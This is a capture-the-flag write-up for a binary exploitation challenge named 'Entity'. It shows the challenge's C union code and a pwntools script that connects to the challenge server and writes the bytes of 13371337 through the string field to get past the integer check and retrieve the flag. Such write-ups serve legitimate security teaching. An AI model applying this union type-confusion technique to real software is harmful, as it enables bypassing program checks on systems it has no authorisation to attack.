# [Pwn] Entity

This challenge is composed of a binary and its C source code. The code consists mainly in a `union` whose fields are either set or get, depending on the user input.

```c
static union {
    unsigned long long integer;
    char string[8];
} DataStore;

typedef enum {
    STORE_GET,
    STORE_SET,
    FLAG
} action_t;

typedef enum {
    INTEGER,
    STRING
} field_t;

typedef struct {
    action_t act;
    field_t field;
} menu_t;
```

The setter will copy the input buffer into the recipient field if we are setting the STRING type

```c
void set_field(field_t f) {
    char buf[32] = {0};
    printf("\nMaybe try a ritual?\n\n>> ");
    fgets(buf, sizeof(buf), stdin);
    switch (f) {
    case INTEGER:
        sscanf(buf, "%llu", &DataStore.integer);
        if (DataStore.integer == 13371337) {
            puts("\nWhat's this nonsense?!");
            exit(-1);
        }
        break;
    case STRING:
        memcpy(DataStore.string, buf, sizeof(DataStore.string));
        break;
    }

}
```

If we copy the right value to the string, to overflow into the integer, we can bypass the setter check (the integer is different from `13371337`). Yet, this value is required to run the `get_flag` function

```c
void get_flag() {
    if (DataStore.integer == 13371337) {
        system("cat flag.txt");
        exit(0);
    } else {
        puts("\nSorry, this will not work!");
    }
}
```

After some trial and error, this exploit is about:

 - running the different commands (`T` then `S`) to set the STRING
 - set it to the bytes corresponding to `13371337`
 - run the get flag command (`C`)

```python
from pwn import *

def wait_for_input(r, lines):
    lel = r.recvlinesS(lines)
    print('\n'.join(lel))

def main():
    r = remote('142.93.35.129',31171)
    wait_for_input(r, 7)
    r.send(b'T\n')
    wait_for_input(r, 3)
    r.send(b'S\n')
    wait_for_input(r, 3)
    leet_num = 13371337
    r.send(leet_num.to_bytes(8, 'little'))
    r.send(b"\n")
    wait_for_input(r, 5)
    r.send(b'C\n')
    flag = r.readline()
    print(flag)
    r.close()

main()
```
